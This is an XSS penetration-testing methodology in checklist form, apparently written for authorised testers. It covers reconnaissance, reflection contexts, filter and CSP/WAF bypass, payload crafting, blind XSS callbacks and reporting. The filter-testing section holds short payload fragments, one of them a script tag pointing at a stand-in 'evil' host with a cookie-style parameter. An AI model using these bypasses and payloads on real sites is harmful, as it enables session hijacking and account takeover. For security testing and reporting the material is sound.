# XSS Methodology

## 1. Reconnaissance & Discovery

- Identify the tech stack and security mechanisms
- Enumerate all endpoints, parameters, and user inputs
- Map all input vectors:
    - URL parameters
    - Form fields
    - HTTP headers (User-Agent, Referer, Cookie)
    - File uploads
    - JSON/XML data in requests
- Inspect element & view-source
    - Look for input fields
    - Attributes like id= and name=
- Check for CSP and other security headers
- Use a specific tracking keyword in requests to identify reflections
- Filter Burp traffic with this keyword to identify reflections

## 2. Context Analysis

- Determine where and how inputs are reflected or stored
- Identify the specific context of each reflection:
    - HTML body context
    - HTML attribute context
    - JavaScript context
    - CSS context
    - URL context
- Analyze any encoding or transformation applied to input
- Document where user input appears in the DOM
- Trace data flow from source to sink in DOM-based scenarios

## 3. Filter & Protection Testing

- Test basic payloads to understand sanitization mechanisms
- Compare handling of benign tags `<h2>` vs potentially dangerous tags `<script>`
- Test tag completion behavior with fragments like `<script src=//evil/?c=`
- Try trailing slashes: `</script/x>` to potentially break filters
- Test nested tags: `<<h2>>` (may strip outer tags leaving `<h2>`)
- Check for case sensitivity: `<IFRAME>` vs `<iframe>`
- Probe for event handler filtering with non-standard handlers: `"onxss=`
- Try non-existent tags: `<notreal onpointerrawupdate=alert(0)>`
- Document filter behavior and any bypass techniques discovered

## 4. Payload Crafting

- Create context-specific payloads based on your analysis
- Develop custom payloads for identified filter bypasses
- Prepare obfuscation techniques:
    - HTML encoding
    - JavaScript encoding
    - URL encoding
    - Mixed encoding
    - Unicode/alternative representations
- Create polyglot payloads for multi-context testing
- Develop different payload categories:
    - Basic proof-of-concept (`alert()`, `console.log()`)
    - Session theft payloads
    - Keyloggers
    - CSRF token extractors

## 5. Execution Testing

- Test payloads systematically across all identified input points
- For reflected XSS: verify immediate execution in response
- For stored XSS: confirm persistence across sessions/users
- For DOM-based XSS: trace execution flow through JavaScript
- Implement blind XSS testing:
    - Include callbacks to external servers
    - Test in admin panels or restricted areas
    - Use frameworks like XSSHunter or custom callback servers
- Document successful execution paths

## 6. Cross-Browser Verification

- Test successful payloads across multiple browsers:
    - Chrome
    - Firefox
    - Safari
    - Edge
- Document browser-specific behaviors or quirks
- Identify payloads that work universally vs. browser-specific ones
- Test mobile browsers if relevant to the application

## 7. Impact & Exploitation Assessment

- Document the complete attack chain from injection to execution
- Assess the potential impact:
    - Session hijacking
    - Account takeover
    - Data exfiltration
    - Privilege escalation
- Create proof-of-concept demonstrations for reporting
- Consider the user roles affected and data exposure risks
- Document any chaining opportunities with other vulnerabilities

## 8. Bypass Advanced Protections

- Test against WAF/advanced filter evasion:
    - Mutation techniques
    - Alternative execution methods (eval alternatives)
    - JavaScript prototype pollution
    - Template injection if applicable
- Attempt to bypass Content Security Policy:
    - Look for misconfigurations
    - Script gadgets
    - JSONP endpoints
    - Angular/Vue/React-specific bypasses
- Document successful advanced bypass techniques

## 9. Reporting & Documentation

- Create clear reproduction steps
- Include screenshots and proof-of-concept code
- Suggest appropriate remediation strategies
- Categorize severity based on impact and exploitability
- Document potential for vulnerability chaining
